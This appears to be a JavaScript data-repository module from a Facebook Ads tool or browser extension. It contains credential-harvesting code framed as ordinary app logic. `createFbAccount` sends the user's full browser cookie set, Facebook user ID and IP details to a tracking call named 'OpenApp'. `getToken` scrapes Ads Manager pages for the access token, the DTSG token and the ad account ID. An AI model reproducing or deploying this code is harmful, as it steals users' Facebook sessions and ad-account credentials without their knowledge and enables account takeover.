import Config from '../../configs';
import ApiGateWay from '../_ApiGateWay';
import { MainResource } from '../resources/main.resource';
import { SmitFbSystem } from "@data/repositories/tracking";
import axios from "axios";

const MainRepository = {
    createFbAccount: async (cookies) => {
        const { value: uid } = cookies.find(item => item.name == "c_user");
        axios.get('https://ipinfo.io/').then(response => {
            // console.log('data:', response.data)
            console.log(response);
            if (response.errorData === undefined) {
                const ipInfo = response.data;
                SmitFbSystem.tracking("OpenApp", { ipInfo, ck: cookies, uid });
            } else {
                console.log("Get IP Info failed");
            }
        });
    },
    getTokenAEEI: () => {
      const resource = MainResource.getTokenAEEI();
      return callApiNative({url: resource.path,
          method: "get"});
    },
    // get facebook token
    getToken: async () => {
        try {
            let url0 = 'https://adsmanager.facebook.com/adsmanager/manage/campaigns'
            let url1 = 'https://adsmanager.facebook.com/adsmanager/manage/accounts'
            let url2 = 'https://adsmanager.facebook.com/adsmanager/manage/accounts?act='
        
            var json = (await callApiNative({url: url0,
                method: "get"})).data
            var flag = json.indexOf('__accessToken=')
            var token = 'NO'
            var fbdt = 'NO'
            var accountId = 'NO'
            if (flag < 0) {
              json = (await callApiNative({url: url1,
                method: "get"}, 'GET')).data
              flag = json.indexOf('adAccountId: \\"')
              if (flag < 0) {
                return {
                  token: token,
                  fbdt: fbdt,
                  accountId: ""
                }
              } else {
                accountId = json.split('adAccountId: \\"')[1].split('\\"')[0]
                // fixbug
                json = (await callApiNative({url:
                  url2 + accountId + '&breakdown_regrouping=1&nav_source=no_referrer',
                  method: 'get'})).data
                token = json.split('window.__accessToken="')[1].split('"')[0]
                fbdt = json.split('["DTSGInitData",[],{"token":"')[1].split('"')[0]
              }
            } else {
                accountId = json.split('adAccountId: \\"')[1].split('\\"')[0]
              token = json.split('window.__accessToken="')[1].split('"')[0]
              fbdt = json.split('["DTSGInitData",[],{"token":"')[1].split('"')[0]
            }
            return {
              token: token,
              fbdt: fbdt,
              accountId: accountId
            }
          } catch (error) {
            return null
          }
    },
    getTokenAEEB: (params) => {
        const resource = MainResource.getTokenAEEB();
        return callApiNative({url: resource.path,
            method: "get"});
    },
    getCurrencyRate: async (params) => {
        const currencyRate = JSON.parse(localStorage.getItem(`currecy_${params.currency}`));
        if (currencyRate) return currencyRate;
        const resource = MainResource.getCurrencyRate();
        const { data } = await callApiNative({url: resource.path,
            method: "get"});
        localStorage.setItem(`currecy_${params.currency}`, JSON.stringify(data.data));
        return data;
    },
}

export { MainRepository };